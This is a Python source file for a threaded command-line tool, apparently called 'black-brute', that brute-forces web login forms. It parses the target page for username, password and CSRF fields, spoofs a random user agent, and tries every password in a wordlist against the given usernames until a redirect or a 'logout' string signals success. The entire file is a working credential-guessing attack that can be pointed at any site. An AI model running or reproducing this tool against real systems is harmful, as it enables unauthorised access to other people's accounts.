import sys
import threading
import queue
import requests
from bs4 import BeautifulSoup
from termcolor import cprint
from .utils import load_config, get_random_user_agent, setup_logger

BSB_LOGO = r"""
┳┓┏┓┳┓
┣┫┗┓┣┫
┻┛┗┛┻┛
      """
class BruteForcer:
    def __init__(self, login_url, usernames, password_file):
        self.login_url = login_url
        self.usernames = usernames
        self.password_file = password_file
        self.logger = setup_logger('brute_force')
        cfg = load_config()
        self.timeout = cfg.get('DEFAULT_TIMEOUT', 10)
        self.thread_count = cfg.get('THREAD_COUNT', 10)
        self.headers = {'User-Agent': get_random_user_agent()}
        self.form_action = None
        self.uname_field = None
        self.pwd_field = None
        self.csrf_field = None
        self.csrf_value = None
        self.found = threading.Event()
        self.found_credentials = None

    def analyze_form(self):
        """
        ফর্ম ফিল্ড (username, password, csrf) ডিটেকশন
        """
        try:
            resp = requests.get(self.login_url, headers=self.headers, timeout=self.timeout)
            resp.raise_for_status()
            soup = BeautifulSoup(resp.text, 'lxml')
            form = soup.find('form')
            if not form:
                cprint("[BSB] No login form found on the page.", "red")
                return False

            action = form.get('action') or self.login_url
            self.form_action = action if action.startswith('http') else self.login_url

            inputs = form.find_all('input')
            for inp in inputs:
                name = inp.get('name', '')
                t = inp.get('type', '')
                if 'user' in name.lower():
                    self.uname_field = name
                if 'pass' in name.lower():
                    self.pwd_field = name
                if t == 'hidden':
                    # সাধারণভাবে CSRF field শনাক্তের চেষ্টা
                    if inp.get('value') and 'csrf' in name.lower():
                        self.csrf_field = name
                        self.csrf_value = inp.get('value')

            if not self.uname_field or not self.pwd_field:
                cprint("[BSB] Could not automatically detect username/password fields. Using defaults: 'username' & 'password'.", "yellow")
                self.uname_field = self.uname_field or 'username'
                self.pwd_field = self.pwd_field or 'password'

            self.logger.info(f"Form action: {self.form_action}, Uname field: {self.uname_field}, Pwd field: {self.pwd_field}, CSRF field: {self.csrf_field}")
            return True

        except Exception as e:
            self.logger.error(f"Error analyzing form: {e}")
            return False

    def worker(self, user, password_queue):
        """
        প্রতিটি username এর জন্য পাসওয়ার্ড লিস্ট থেকে চেষ্টা
        """
        while not password_queue.empty() and not self.found.is_set():
            pwd = None
            try:
                pwd = password_queue.get(block=False)
            except queue.Empty:
                return

            data = {self.uname_field: user, self.pwd_field: pwd}
            if self.csrf_field:
                data[self.csrf_field] = self.csrf_value

            try:
                attempt = requests.post(self.form_action, data=data, headers=self.headers, timeout=self.timeout, allow_redirects=False)
                location = attempt.headers.get('Location', '')
                text = attempt.text.lower()
                self.logger.debug(f"Tried {user}:{pwd} -> Status: {attempt.status_code}")
                # Success condition: Redirect away or “logout” মিলে
                if 'logout' in text or (location and self.login_url not in location):
                    self.found_credentials = (user, pwd)
                    cprint(f"[BSB] Success! Username: {user} Password: {pwd}", "red")
                    self.logger.warning(f"BRUTE SUCCESS -> {user}:{pwd}")
                    self.found.set()
                    return
                else:
                    cprint(f"[BSB] Tried {user}:{pwd}", "yellow")
            except Exception as e:
                self.logger.error(f"Error attempting {user}:{pwd} -> {e}")

    def run(self):
        if not self.analyze_form():
            return

        try:
            with open(self.password_file, 'r') as f:
                all_passwords = [line.strip() for line in f if line.strip()]
        except Exception as e:
            cprint(f"[BSB] Could not read password file: {e}", "red")
            self.logger.error(f"Password file read error: {e}")
            return

        cprint(BSB_LOGO, "cyan")
        cprint(f"[BSB] Starting threaded brute-force on: {self.login_url}", "green")

        threads = []
        for user in self.usernames:
            password_queue = queue.Queue()
            for pwd in all_passwords:
                password_queue.put(pwd)

            for _ in range(self.thread_count):
                t = threading.Thread(target=self.worker, args=(user, password_queue))
                t.daemon = True
                t.start()
                threads.append(t)

        for t in threads:
            t.join()

        if not self.found.is_set():
            cprint("[BSB] Brute-force completed. No valid credentials found.", "blue")
            self.logger.info("Brute-force finished with no success.")

def main():
    if len(sys.argv) < 4:
        cprint("Usage: black-brute <login_page_url> <comma_separated_usernames> <password_file>", "yellow")
        return
    login_url = sys.argv[1]
    usernames = sys.argv[2].split(',')
    password_file = sys.argv[3]
    brute = BruteForcer(login_url, usernames, password_file)
    brute.run()
